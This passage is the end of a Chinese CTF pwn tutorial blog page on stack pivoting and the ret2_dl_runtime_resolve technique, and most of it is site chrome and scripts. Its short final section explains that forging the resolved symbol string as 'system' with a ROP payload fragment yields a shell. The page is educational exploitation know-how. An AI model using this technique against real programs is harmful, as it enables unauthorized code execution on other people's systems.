+<h2 id="3-5-system"><a href="#3-5-system" class="headerlink" title="3.5 system"></a><strong>3.5 system</strong></h2><p>由于dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。因此我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。即rop.raw(‘system\x00’)：</p>
+<p>成功获取shell：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/dend.png?x-oss-process=style/watermark"
+                     
+                ></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 栈迁移+ret2_dl_runtime_reslove</li>
+        <li><strong>Author:</strong> wutong</li>
+        <li><strong>Created at:</strong> 2023-07-13 14:05:54</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-07-22 17:43:01
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://wutong01304.github.io/2023/07/13/ret2dlruntime/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Stack/">#Stack</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ret2-dl-runtime-resolve/">#ret2_dl_runtime_resolve</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/07/15/SROP/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">SROP</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/07/11/ret2csu/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">ret2csu</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">栈迁移+ret2_dl_runtime_reslove</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-text">一、栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.1 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E4%BE%8B%E9%A2%98"><span class="nav-text">1.2 例题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">二、基本原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-text">三、攻击原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-reloc-arg"><span class="nav-text">3.1 reloc_arg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-Elf32-Rel"><span class="nav-text">3.2 Elf32_Rel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-dynsym"><span class="nav-text">3.3 .dynsym</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-dynstr"><span class="nav-text">3.4 .dynstr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5-system"><span class="nav-text">3.5 system</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">wutong</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.1</a>
+        </div>
+        
+        
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
